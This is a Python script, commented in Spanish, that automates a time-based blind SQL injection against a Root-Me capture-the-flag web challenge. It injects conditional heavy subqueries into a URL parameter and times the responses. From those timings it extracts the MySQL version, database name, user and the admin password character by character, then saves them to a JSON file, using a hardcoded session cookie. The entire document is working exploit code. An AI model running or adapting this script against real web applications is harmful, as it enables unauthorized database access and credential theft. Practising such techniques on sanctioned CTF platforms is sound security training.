#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 3 - CON LOG Y GUARDADO
"""
import requests
import time
import statistics
import json
from datetime import datetime

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM users, users T1)"
        self.results = {}
        self.log_entries = []
        
    def log(self, msg, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        entry = f"[{timestamp}] [{level}] {msg}"
        print(entry)
        self.log_entries.append(entry)
    
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition, repeats=3):
        payload = f"1 AND IF({condition}, {self.heavy}, 0)"
        t = self.test_payload(payload, repeats=repeats)
        return t > self.threshold
    
    def get_length(self, query):
        self.log(f"Obteniendo longitud: {query[:40]}...", "DEBUG")
        
        for i in range(1, 100):
            cond = f"LENGTH(({query})) = {i}"
            if self.is_true(cond, repeats=2):
                return i
            if i % 10 == 0:
                self.log(f"  Probado hasta {i}", "DEBUG")
        
        return 0
    
    def extract_char(self, query, pos):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
            if self.is_true(cond, repeats=2):
                low = mid + 1
            else:
                high = mid - 1
        return chr(low)
    
    def extract_string(self, query, label="Extrayendo"):
        self.log(f"{label}...")
        
        length = self.get_length(query)
        if length == 0:
            self.log("  No se pudo obtener la longitud", "ERROR")
            return None
        
        self.log(f"  Longitud: {length}")
        
        result = ""
        for pos in range(1, length + 1):
            char = self.extract_char(query, pos)
            result += char
            self.log(f"  [{pos}/{length}] '{char}' (ASCII: {ord(char)})")
        
        return result
    
    def save_results(self, filename="results.json"):
        """Guarda los resultados en un archivo JSON"""
        data = {
            "timestamp": datetime.now().isoformat(),
            "url": URL,
            "baseline": self.baseline,
            "threshold": self.threshold,
            "heavy": self.heavy,
            "results": self.results,
            "log": self.log_entries
        }
        
        with open(filename, "w") as f:
            json.dump(data, f, indent=2)
        
        self.log(f"Resultados guardados en {filename}")

# EJECUCIÓN
injector = TimeBasedSQLInjector()

print("=" * 70)
print("  SQL INJECTION TIME-BASED - ROOT-ME CH40")
print("=" * 70)

# Extraer datos
injector.results["version"] = injector.extract_string("SELECT VERSION()", "Versión de MySQL")
injector.results["database"] = injector.extract_string("SELECT DATABASE()", "Base de datos")
injector.results["user"] = injector.extract_string("SELECT USER()", "Usuario")

# Extraer contraseña
injector.results["password"] = injector.extract_string(
    "SELECT pass FROM usuarios WHERE username='admin'",
    "Contraseña del admin"
)

# Guardar resultados
injector.save_results()

# Mostrar resumen
print("\n" + "=" * 70)
print("  RESUMEN FINAL")
print("=" * 70)
for key, value in injector.results.items():
    print(f"  {key}: {value}")
